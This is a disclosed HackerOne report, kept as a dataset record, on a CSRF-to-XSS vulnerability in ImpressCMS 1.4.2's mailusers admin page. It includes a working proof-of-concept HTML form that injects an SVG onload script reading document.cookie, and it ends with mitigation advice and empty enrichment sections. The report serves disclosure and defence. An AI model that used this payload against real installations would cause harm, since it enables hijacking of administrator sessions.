---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1096123'
original_report_id: '1096123'
title: CSRF to XSS in /htdocs/modules/system/admin.php
weakness: Cross-Site Request Forgery (CSRF)
team_handle: impresscms
created_at: '2021-02-05T12:56:32.575Z'
disclosed_at: '2023-10-14T18:47:43.005Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 21
asset_identifier: https://github.com/impresscms/impresscms
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF to XSS in /htdocs/modules/system/admin.php

## Metadata

- HackerOne Report ID: 1096123
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: impresscms
- Disclosed At: 2023-10-14T18:47:43.005Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

The ```memberslist_id``` and ```memberlist_uname[]``` POST parameters in the scenario "/htdocs/modules/system/admin.php" are affected by XSS due to lack of user supplied data filtration. Due to lack of CSRF token verification it is possible for attacker to craft special web page, which will perform request to the vulnerable ImpressCMS application on authorised user behalf, upon visiting it. 

## ImpressCMS branch :

Impress CMS version: 1.4.2
PHP Version: 7.2.24

## Browsers Verified In:

Firefox 85.0

## Steps To Reproduce:

  1) Host a web server with the following page (note that url in form action should be modified with your testing address)

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://<YOUR IMPRESS CMS HOST>/htdocs/modules/system/admin.php?fct=mailusers" method="POST">
        <input type="hidden" name="mail&#95;to&#95;group&#91;&#93;" value="2" />
      <input type="hidden" name="mail&#95;lastlog&#95;min" value="" />
      <input type="hidden" name="mail&#95;lastlog&#95;max" value="" />
      <input type="hidden" name="mail&#95;idle&#95;more" value="" />
      <input type="hidden" name="mail&#95;idle&#95;less" value="" />
      <input type="hidden" name="mail&#95;regd&#95;min" value="" />
      <input type="hidden" name="mail&#95;regd&#95;max" value="" />
      <input type="hidden" name="mail&#95;fromname" value="ImpressCMS" />
      <input type="hidden" name="mail&#95;fromemail" value="impress&#64;notexist&#46;notexist" />
      <input type="hidden" name="mail&#95;subject" value="" />
      <input type="hidden" name="mail&#95;body" value="&#123;&#36;smarty&#46;version&#125;" />
      <input type="hidden" name="mail&#95;send&#95;to&#91;&#93;" value="mail" />
      <input type="hidden" name="mail&#95;submit" value="Send" />
      <input type="hidden" name="op" value="send" />
      <input type="hidden" name="mail&#95;start" value="0" />
      <input type="hidden" name="memberslist&#95;id&#91;&#93;" value="asdf&apos;&gt;&lt;&#47;a&gt;&lt;svg&#47;onload&#61;alert&#40;document.cookie&#41;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```
  2)  Login to your ImpressCMS application with privileged account
  3) In the same browser open web page from step 1 and click "Submit request"
  4) See the XSS payload fired 

## Suggestions to mitigate or resolve the issue:
Properly sanitise  user input using built-in ```StopXSS``` function. Properly check CSRF token

## Credits
This bug was found as a part of Solar Security CMS Reseach, with https://hackerone.com/d0bby, https://hackerone.com/wezery0, https://hackerone.com/silvereniqma in collaboration. Can you, please, add them to this report?

## Impact

CSRF leading to XSS

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
